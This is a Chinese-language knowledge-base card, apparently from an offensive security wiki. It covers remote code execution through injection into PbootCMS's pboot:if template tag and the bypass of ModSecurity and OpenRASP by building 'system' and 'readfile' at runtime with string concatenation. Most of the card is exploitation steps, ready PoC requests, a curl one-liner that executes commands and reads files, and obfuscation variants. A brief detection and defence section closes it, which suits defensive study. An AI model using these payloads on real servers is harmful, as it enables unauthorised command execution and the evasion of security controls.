---
id: web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass
title: PbootCMS pboot:if 表达式注入配合三元字符串拼接函数名绕过 WAF 与 RASP
type: scenario
domain: web
path: web/php/rce
technique: pbootcms-iflabel-dynamic-function-call
tags:
- php
- pbootcms
- cms
- template-injection
- rce
- waf-bypass
- rasp-bypass
- dynamic-function-call
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:46:40+08:00'
  notes: 已修复白名单表述并复核：图3源码为 function_exists(trim($value)) && !in_array($value, $white_fun)，卡片已改为『危险函数名白名单』并引用原条件；注入点、ModSecurity 403/OpenRASP 302、三元拼接 payload 与 uid=82 回显均与原文图1-7一致。复核通过。
url: /docs/web/php/rce/web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass/
draft: false
kb_aliases:
- PbootCMS 模板 RCE
- pboot:if 代码执行
- 三元拼接函数名
- ModSecurity OpenRASP 绕过
- ('sys'.'tem')('id')
---

## 一句话结论

PbootCMS 的 `pboot:if` 标签会把标签内表达式拼进 `eval('if(...)...')`；攻击者用 `?a=}{pboot:if(...)}test{/pboot:if}` 逃逸出模板上下文后，把危险函数名拆成三元表达式 `(1?'sys'.'tem':'')('id')`，运行时才拼出 `system`，从而同时绕过 ModSecurity 的字面量规则和 OpenRASP 的函数名检测并执行命令。

## 原理

- PbootCMS 的 `ParserController::parserIfLabel()` 解析 `{pboot:if(...)}...{/pboot:if}` 时，会取出括号内表达式并执行类似 `eval('if(' . $expr . '){$flag="if";}else{$flag="else";}')` 的拼接。
- 表达式只经过两类检查：危险函数名白名单（`function_exists(trim($value)) && !in_array($value, $white_fun)`，按 `$white_fun` 允许列表过滤）和一段针对 `$GET/$POST/$COOKIE/...` 变量的正则；它不会求值 PHP 的字符串拼接结果。
- 攻击者用 `}` 提前闭合外层模板表达式，再插入自己的 `pboot:if` 标签，使 `$expr` 完全可控。
- 直接写 `system('id')` 会被两层防护拦下：ModSecurity 对请求中的 `system(` 等特征返回 403；OpenRASP 在 PHP 运行时按函数名/危险调用拦截并跳转告警页。
- `(1?'sys'.'tem':'')('id')` 在 PHP 中先求值三元表达式得到字符串 `system`，再以字符串作函数名调用。请求正文里没有连续的 `system` 字样，静态规则匹配不到；而 PHP 的动态函数调用语义允许这种写法，于是两层检测都被绕过。
- 同理 `(1?'read'.'file':'')('/flag')` 可绕过 `readfile` 关键字执行任意文件读取。

## 触发条件

- 目标为存在 `pboot:if` 表达式求值的 PbootCMS 版本（原文环境 V3.1.2）。
- 攻击者能向可渲染模板的参数传入 `?a=` 等值，并可用 `}` 闭合外层表达式。
- WAF/RASP 采用字面量函数名或固定关键字匹配，未对请求做 PHP 语义求值或 AST 级检查。
- 目标函数（`system`、`readfile` 等）未被 `disable_functions` 禁用；若被禁用需换用未禁用的等价函数。

## 利用步骤

1. 探测 PbootCMS 指纹与模板参数入口（如 `/?a=`）。
2. 先发公开链或直接 `system('id')` 观察拦截形态：WAF 返回 403，或 OpenRASP 302 跳转 blocked 页。
3. 把函数名拆成字符串拼接，用三元表达式包一层：`(1?'sys'.'tem':'')('id')`。
4. 用 `}` 闭合外层表达式并补 `test{/pboot:if}` 维持模板结构，整体放入 `a` 参数。
5. 观察响应是否出现 `uid=...` 等命令输出；文件读取同理替换函数名与参数。

## PoC

```http
GET /?a=}{pboot:if((1?'sys'.'tem':'')('id'))}test{/pboot:if} HTTP/1.1
Host: target
```

原文响应中出现：

```text
uid=82(www-data) gid=82(www-data) groups=82(www-data)
```

文件读取变体：

```http
GET /?a=}{pboot:if((1?'read'.'file':'')('/flag'))}test{/pboot:if} HTTP/1.1
Host: target
```

最小 curl：

```bash
curl -s 'http://target/?a=%7D%7Bpboot%3Aif%28%281%3F%27sys%27.%27tem%27%3A%27%27%29%28%27id%27%29%29%7Dtest%7B%2Fpboot%3Aif%7D'
```

成功标志：响应包含命令执行结果而非 403/告警页。

## 变体与关联

- 变体：去掉三元，直接 `('sys'.'tem')('id')`；或用 `chr(115).chr(121)...`、`base64_decode`、变量函数 `$f='system';$f('id')` 等方式拆分。
- 变体：把命令参数也拆分/编码（如 `'i'.'d'`），绕过对命令关键字的匹配。
- 关联：[[web-php-rce-seacms-search-template-code-execution]]（同为模板表达式注入 + WAF 函数黑名单绕过，但 SeaCMS 用的是大小写/同义函数）；[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（运行时重组函数名规避静态检测）。
- 边界：若 WAF 对请求先做 PHP 语法/AST 分析、或 RASP 在 eval 后按实际调用名 hook，本手法会被识别；`disable_functions` 禁用目标函数时需换函数。

## 检测与防御

- 检测：请求中出现 `pboot:if` 嵌套、单独的 `}` 闭合、`('...'.'...')(`、`$f(...)`、`chr(` 拼接等动态调用特征；同一参数同时出现模板标签与函数调用语法。
- 检测：WAF 403 后紧接变形请求；OpenRASP 告警页与后续 200 响应来自同一源。
- 防御：升级/修复 PbootCMS 模板表达式求值，禁止在标签中执行任意 PHP；对模板表达式做 AST 白名单而不是关键字黑名单；生产环境关闭 `eval` 型标签或对 `pboot:if` 参数做严格语法限制。
- 加固：WAF 结合语义解码与拼接还原；RASP 在运行时 hook 实际函数调用；`disable_functions` 覆盖命令执行与文件读取函数；最小权限运行 Web 进程。
